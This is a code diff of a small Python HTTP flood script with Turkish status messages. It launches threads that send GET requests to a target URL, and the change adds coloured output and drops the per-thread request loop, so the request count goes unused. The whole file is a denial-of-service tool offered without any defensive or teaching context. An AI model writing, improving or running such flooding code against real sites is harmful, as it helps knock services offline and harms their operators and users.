@@ -1,20 +1,19 @@
 import argparse
 import threading
 import requests
+from colorama import init, Fore
+
+init(autoreset=True)
 
 def http_flood(target_url, request_count, thread_count):
-    def send_request(request_number):
+    def send_request():
         try:
             requests.get(target_url)
-            print(f"[+] Paket gönderildi {request_number}/{request_count}")
+            print(Fore.GREEN + "[+] İstek Gönderildi")
         except:
-            print(f"[-] Hata! İstek {request_number}/{request_count} başarısız.")
+            print(Fore.RED + "[-] Hata! İstek başarısız.")
 
-    def worker():
-        for i in range(request_count // thread_count):
-            send_request(i + 1)
-
-    threads = [threading.Thread(target=worker) for _ in range(thread_count)]
+    threads = [threading.Thread(target=send_request) for _ in range(thread_count)]
     for thread in threads:
         thread.start()
     for thread in threads:
